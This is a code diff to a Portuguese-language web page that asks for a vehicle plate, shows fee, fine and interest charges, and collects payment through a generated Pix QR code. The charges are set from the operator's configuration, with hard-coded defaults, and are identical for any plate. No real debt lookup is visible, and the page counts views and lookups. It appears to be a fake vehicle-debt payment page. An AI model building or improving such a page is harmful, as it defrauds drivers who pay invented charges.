@@ -112,7 +112,7 @@
 
                 <p class="card-title" id="card-dynamic-title">Informe uma <strong>placa</strong> válida para consultar:</p>
                 <div class="input-group">
-                    <input type="text" id="plate-input" class="input-plate" placeholder="DIGITE SUA PLACA" maxlength="7">
+                    <input type="text" id="plate-input" class="input-plate" placeholder="DIGITE SUA PLACA" maxlength="8">
                 </div>
                 <label class="checkbox-container" id="wrapper-foreign">
                     <input type="checkbox" id="foreign-plate">
@@ -244,17 +244,16 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getDatabase, ref, get, set, onValue, runTransaction } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+        import { getDatabase, ref, get, set, onValue } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-        // MUDANÇA AQUI: Busca as credenciais na nova rota Node.js
+        // Registra acesso ao carregar a página
+        fetch('/api/registrar-acesso', { method: 'POST' }).catch(() => {});
+
         const responseConfig = await fetch('/api/config');
         const appConfig = await responseConfig.json();
 
         const app = initializeApp(appConfig.firebase);
         const db = getDatabase(app);
-
-        runTransaction(ref(db, 'metricas/views'), (currentValue) => (currentValue || 0) + 1)
-            .catch(err => console.error("Erro ao registrar acesso:", err));
 
         const plateInput = document.getElementById('plate-input');
         const btnSubmit = document.getElementById('btn-submit');
@@ -389,18 +388,26 @@
             const agora = new Date();
             dateTimeDisplay.textContent = `Atualizado em: ${String(agora.getDate()).padStart(2, '0')}/${String(agora.getMonth() + 1).padStart(2, '0')}/${agora.getFullYear()}`;
 
+            // Atualiza Taxas vindas do banco
             try {
                 const configSnapshot = await get(ref(db, 'configuracoes/taxas'));
-                if (configSnapshot.exists()) {
-                    const taxas = configSnapshot.val();
+                let taxas = configSnapshot.exists() ? configSnapshot.val() : null;
+                if (!taxas) {
+                    const resTax = await fetch('/api/taxas');
+                    taxas = await resTax.json();
+                }
+                if (taxas) {
                     const setTax = (id, val) => {
                         const elem = document.getElementById(id);
-                        elem.setAttribute('data-amount', val);
-                        elem.nextElementSibling.querySelector('.debt-item-price').textContent = parseFloat(val).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+                        if (elem) {
+                            elem.setAttribute('data-amount', val);
+                            const priceElem = elem.nextElementSibling.querySelector('.debt-item-price');
+                            if (priceElem) priceElem.textContent = parseFloat(val).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+                        }
                     };
-                    setTax('chk-tarifa', taxas.base);
-                    setTax('chk-multa', taxas.fine);
-                    setTax('chk-juros', taxas.interest);
+                    setTax('chk-tarifa', taxas.base || taxas.tarifa_base || 14.50);
+                    setTax('chk-multa', taxas.fine || taxas.multa_adm || 15.00);
+                    setTax('chk-juros', taxas.interest || taxas.juros_mora || 4.40);
                 }
             } catch (err) {
                 console.error("Erro ao buscar taxas:", err);
@@ -410,21 +417,23 @@
             recalculateTotal();
 
             try {
+                // Registra consulta no Backend para garantir salvamento no Firebase
+                await fetch('/api/registrar-consulta', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        placa: entradaLimpa,
+                        valor: currentTotalCalculated,
+                        tipo_busca: currentType
+                    })
+                });
+
                 const dbRef = ref(db, 'veiculos/' + entradaLimpa);
                 const snapshot = await get(dbRef);
 
-                if (snapshot.exists() && snapshot.val().status === "pago") {
+                if (snapshot.exists() && (snapshot.val().status === "pago" || snapshot.val().status === "APPROVED")) {
                     abrirTela(screenSuccess);
                 } else {
-                    if (!snapshot.exists()) {
-                        await set(dbRef, {
-                            placa: entradaLimpa,
-                            valor: currentTotalCalculated,
-                            status: "pendente",
-                            tipo_busca: currentType,
-                            data_consulta: agora.toISOString()
-                        });
-                    }
                     btnPayAction.style.display = "flex";
                     pixPaymentBox.style.display = "none";
                     resetarBotaoPagamento();
@@ -451,10 +460,7 @@
             btnPayAction.style.pointerEvents = "none";
             btnPayAction.style.opacity = "0.7";
 
-            runTransaction(ref(db, 'metricas/clicks'), (curr) => (curr || 0) + 1).catch(err => console.error(err));
-
             try {
-                // MUDANÇA AQUI: Chamada enviada para a rota /api/gerar-pix
                 const resposta = await fetch('/api/gerar-pix', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -467,9 +473,9 @@
                 });
 
                 const dadosPix = await resposta.json();
-                if (dadosPix.qr_code_url) {
-                    pixQrImg.src = dadosPix.qr_code_url; 
-                    stringCopiaColaPix = dadosPix.copy_paste; 
+                if (dadosPix.status && (dadosPix.qr_code_url || dadosPix.copy_paste)) {
+                    pixQrImg.src = dadosPix.qr_code_url || `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(dadosPix.copy_paste)}`; 
+                    stringCopiaColaPix = dadosPix.copy_paste || dadosPix.copia_cola || ''; 
                     btnPayAction.style.display = "none";
                     pixPaymentBox.style.display = "block";
                 } else {
@@ -504,7 +510,7 @@
                 const dados = snapshot.val();
                 if (dados && dados.status) {
                     const status = dados.status.toString().toUpperCase();
-                    if (status === "PAGO" || status === "COMPLETED") {
+                    if (status === "PAGO" || status === "COMPLETED" || status === "APPROVED") {
                         abrirTela(screenSuccess);
                     }
                 }
